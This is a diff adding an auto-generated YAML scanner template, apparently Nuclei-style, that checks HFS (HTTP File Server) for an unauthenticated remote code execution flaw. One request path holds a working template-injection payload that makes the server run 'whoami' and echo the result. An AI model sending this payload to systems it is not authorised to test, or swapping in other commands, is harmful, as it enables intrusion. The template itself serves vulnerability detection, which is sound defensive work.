@@ -1,0 +1,23 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-hfs-unauth_rce
+info:
+  name: "HFS unauth_rce"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, hfs, ref-poc, rce]
+  description: "由参考项目脚本静态导入：HFS/unauth_rce（类型 RCE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "HFS 2.3m"
+          - "RESULT:"
